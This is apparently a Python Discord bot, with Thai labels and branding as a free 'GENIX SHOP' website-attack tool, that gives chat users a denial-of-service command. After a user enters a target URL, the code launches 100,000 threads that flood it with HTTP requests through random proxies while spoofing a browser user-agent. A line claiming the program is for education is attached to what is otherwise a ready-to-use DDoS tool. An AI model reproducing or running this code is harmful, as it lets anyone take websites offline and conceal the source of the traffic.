import interactions
import datetime
import random
import threading
import urllib.request
from interactions import Button, ButtonStyle, CommandContext, SelectMenu, SelectOption, ActionRow, Modal, TextInput, TextStyleType, Embed

token = 'token' # ใส่โทเค็นบอทตรงนี้

client = interactions.Client(token, intents=interactions.Intents.DEFAULT | interactions.Intents.GUILD_MESSAGES)

@client.event
async def on_start():
    print('sss')

@client.command(
    name='ddos',
    description='ยิงเว็บ',
)
async def commands(ctx: CommandContext):
    tim = datetime.datetime.now()
    s = tim.strftime("%H:%M:%S")
    embed = interactions.Embed(title="GENIX SHOP โปรแกรมยิงเว็บฟรี",color=0x344ceb,description='โปรแกรมนี้เป็นโปรแกรมสำหรับนักพัฒนาทำเพื่อการศึกษา')
    embed.set_image(url="https://cdn.vidyard.com/thumbnails/6059353/kR2NDWm-5AxU_JTU4pII4siOBCFny_uG.gif")
    embed.set_footer(text=f'โปรแกรมทำงานเมื่อเวลา {s}')
    test = Button(
        style=ButtonStyle.PRIMARY,
        custom_id="start",
        label="ATTACK HERE !",
    )
    await ctx.channel.send(embeds=embed, components=[test])

@client.component('start')
async def script(ctx: CommandContext):
    modal = Modal(
        custom_id="success",
        title="GENIX SHOP โปรแกรมยิงเว็บฟรี",
        components=[
            TextInput(
                style=TextStyleType.SHORT,
                custom_id="text-input-1",
                label="Domain/URL",
                placeholder="ตัวอย่าง http://example.com",
            ),
        ],
    )
    await ctx.popup(modal)

@client.modal('success')
async def hakko(ctx: CommandContext, one):
    tim = datetime.datetime.now()
    s = tim.strftime("%H:%M:%S")
    embed = interactions.Embed(title="SUCCESSFULLY !",color=0x6bf502,description=f'เริ่มโจมตีเว็บไซต์ : {one}')
    embed.set_image(url="https://res.cloudinary.com/hy4kyit2a/f_auto,fl_lossy,q_70/learn/modules/aws-cloud-security/protect-against-dos-and-ddos-attacks-with-aws-shield/images/fbcdbe749e6e91156a5460b247e053cc_ff-06-f-733-df-9-b-4596-ab-79-d-44-cc-50-f-8-e-44.png")
    embed.set_footer(text=f'โจมตีแล้วเมื่อเวลา {s}')
    await ctx.send(embeds=embed)
    
    def request(target):
        try:
            f = open('proxy.txt', 'r').read().splitlines()
            proxy = random.choice(f)
            header = urllib.request.ProxyHandler({'http': proxy})
            opener = urllib.request.build_opener(header)
            urllib.request.install_opener(opener) 
            req = urllib.request.Request(target, data=None,headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'})
            urllib.request.urlopen(req)
            print(proxy)
        except:
            pass
    
    for i in range(100000):
        threading.Thread(target=request, args=[one]).start()
        print(i)



client.start()